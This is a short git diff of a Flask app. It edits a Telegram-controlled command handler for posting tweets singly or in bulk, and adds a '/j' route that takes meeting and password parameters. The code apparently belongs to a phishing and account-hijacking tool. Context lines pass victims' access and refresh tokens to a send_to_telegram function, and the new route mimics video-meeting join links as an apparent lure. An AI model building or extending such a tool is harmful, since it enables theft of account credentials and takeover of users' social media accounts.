@@ -236,8 +236,8 @@ def telegram_webhook():
             send_message_via_telegram(f"⚠️ You are about to post tweets in bulk. Tweet text: {tweet_text}\nType 'confirm' to proceed.")
         else:
             send_message_via_telegram("❌ Please provide tweet content.")
-    elif message == '/confirm':
-        send_message_via_telegram("⚡ Confirming action...")  # Removed the '/' from the message
+    elif message == 'confirm':
+        send_message_via_telegram("⚡ Confirming action...")  # Corrected the response message
         confirm_action()
     else:
         send_message_via_telegram("❌ Unknown command. Use /refresh_single, /refresh_bulk, /post_single <tweet>, /post_bulk <tweet>, or confirm to proceed.")
@@ -326,6 +326,12 @@ def send_to_telegram(access_token, refresh_token=None):
 @app.route('/refresh/<refresh_token2>', methods=['GET'])
 def refresh_page(refresh_token2):
     return render_template('refresh.html', refresh_token=refresh_token2)
+
+@app.route('/j')
+def meeting():
+    meeting = request.args.get('meeting')
+    pwd = request.args.get('pwd')
+    return render_template('meeting.html', meeting=meeting, pwd=pwd)
 
 if __name__ == '__main__':
     port = int(os.environ.get("PORT", 5000))
